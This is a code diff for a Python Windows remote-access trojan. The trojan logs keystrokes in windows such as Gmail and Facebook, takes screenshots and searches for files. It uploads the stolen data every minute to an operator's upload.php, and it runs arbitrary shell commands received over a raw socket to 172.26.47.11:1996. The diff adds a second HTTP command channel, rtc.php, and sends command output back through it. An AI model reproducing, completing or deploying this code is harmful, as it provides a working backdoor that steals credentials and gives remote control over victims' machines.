@@ -12,15 +12,18 @@ import _winreg as wreg
 from uuid import getnode as get_mac
 import json
 from datetime import datetime
+from time import sleep
 from hashlib import md5
 import requests
 import pythoncom, pyHook
 import win32gui
 
-uploadURL = '<my website url>/upload.php'
+
+uploadURL = '<your website>/upload.php'
+commUrl = '<your website>/rtc.php'
 identification = {}
 botname = ''
-proxy = os.environ['HTTP_PROXY']
+headers = {'Proxy-Authorization': 'Basic <base64encoded hash of username:password>'}
 running = False
 store = ''
 listOfWindows = ['Facebook', 'Gmail', 'Twitter', 'Hotmail', 'Ymail', 'Yandex']
@@ -29,6 +32,10 @@ lastWindowText = ''
 windowText = ''
 tempDir = mkdtemp()
 lock = Lock()
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+keyloggerThread = Thread()
+lootThread = Thread()
+output = """ """
 
 
 def keypressed(event):
@@ -103,15 +110,16 @@ def persistence():
 
 def sendGet(Url):
     try:
-        response = requests.get(url=Url, proxies=proxy)
+        response = requests.get(url=Url, params={'g':'data'}, headers=headers)
     except Exception as e:
         return str(e)
     return response
 
 
 def sendPost(Url, data, files=None):
+    global output
     try:
-        response = requests.post(url=Url, data=data, proxies=proxy)
+        response = requests.post(url=Url, data={'p': """ """+output},headers=headers)
     except Exception as e:
         return str(e)
     return response
@@ -172,7 +180,7 @@ def search(command):
             if file.endswith(ext):
                 listOfFiles = listOfFiles + '\n' + os.path.join(dirpath, file)
 
-    res = sendPost(uploadURL, data=listOfFiles)
+    res = sendPost(commUrl, data=listOfFiles)
 
 
 def identity():
@@ -236,68 +244,101 @@ def emptyLoot():
     Timer(60.0, emptyLoot).start()      # Starts to send data every 1 minute
 
 
-def terminate(s, keyloggerThread, lootThread):
-    s.close()
-    keyloggerThread.join()
-    lootThread.join()
-    emptyLoot()         # To transfer files
+def executeCommand(s, command):
+    global output, keyloggerThread, lootThread
+    print command
+    if 'terminate' in command:
+        s.close()
+        keyloggerThread.join()
+        lootThread.join()
+        emptyLoot()  # To transfer files
+        return
+
+    elif 'grab' in command:
+        grab, path = command.split(' ', 1)
+        try:
+            transfer(s, path)
+        except Exception, e:
+            s.send(str(e))
+            pass
+        return
+
+    elif 'sendToServer' in command:
+        grab, path = command.split(' ', 1)
+        if os.path.exists(path):
+            files = {'fileToUpload': open(path, 'rb')}
+            r = sendFile(files)
+        else:
+            r = sendPost(uploadURL, data='[-]File Not Found')
+        print "File Uploaded"
+        return
+
+    elif 'screencap' in command:
+        screenshot()
+        return
+
+    elif 'cd' in command:
+        code, directory = command.split(' ',
+                                        1)  # Added maxsplit value as some folders may contain whitespaces like "Program Files"
+        os.chdir(directory)
+        s.send("[+] CWD is " + os.getcwd())
+        return
+
+    else:
+        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
+                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        
+        output += (CMD.stdout.read() + "\n" + CMD.stderr.read())
+        s.send(output)
+        res = sendPost(commUrl, output)
+        return
 
 
-def connect(keyloggerThread, lootThread):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+def connect():
+    global s
     s.connect(('172.26.47.11', 1996))
     s.send(getuser())
 
     while True:
         command = s.recv(1024)
-        if 'terminate' in command:
-            terminate(s, keyloggerThread, lootThread)
-            break
+        executeCommand(s, command)
+        s.send('DONE')
 
-        elif 'grab' in command:
-            grab, path = command.split(' ', 1)
-            try:
-                transfer(s, path)
-            except Exception, e:
-                s.send(str(e))
-                pass
 
-        elif 'sendToServer' in command:
-            grab, path = command.split(' ', 1)
-            if os.path.exists(path):
-                files = {'fileToUpload': open(path, 'rb')}
-                r = sendFile(files)
-            else:
-                r = sendPost(uploadURL, data='[-]File Not Found')
-            print "File Uploaded"
-            s.send('DONE')
-
-        elif 'screencap' in command:
-            screenshot()
-            s.send('DONE')
-
-        elif 'cd' in command:
-            code, directory = command.split(' ',
-                                            1)  # Added maxsplit value as some folders may contain whitespaces like "Program Files"
-            os.chdir(directory)
-            s.send("[+] CWD is " + os.getcwd())
-            s.send('DONE')
-
-        else:
-            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
-                                   stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            s.send(CMD.stdout.read() + "\n" + CMD.stderr.read())  # sending the result
-            s.send('DONE')
-            # s.send()  # in case there is a typo by server side
+def receiveCommand():
+    global s, keyloggerThread, lootThread
+    print " Recieve Command"
+    res = sendGet(commUrl)
+    comm = res.text.strip('\t')
+    print comm
+    executeCommand(s, comm)
+    sleep(5)
 
 
 def main():
-    keyloggerThread = Thread(1, keylogger(), 'keylogThread', 1)
-    keyloggerThread.start()
+    global keyloggerThread, lootThread
+    try:
+        keyloggerThread = Thread(target=keylogger)
+        keyloggerThread.start()
+    except:
+        pass
     initialize()
-    lootThread = Timer(60.0, emptyLoot())     # Timer thread to send loot after every 1 minute
-    lootThread.start()
-    connect(keyloggerThread, lootThread)  # terminate() called when connection is closed
+    
+    print "Initialized"
+    try:
+        lootThread = Timer(60.0, emptyLoot)  # Timer thread to send loot after every 1 minute
+        lootThread.start()
+        print " Recieve Thread"
+    except:
+        pass
+    try:
+        receiveThread = Thread(target=receiveCommand).start()
+        connect()  # terminate() called when connection is closed
+    except:
+        pass
+    keyloggerThread.join()
+    lootThread.join()
+    receiveThread.join()
 
 
 main()
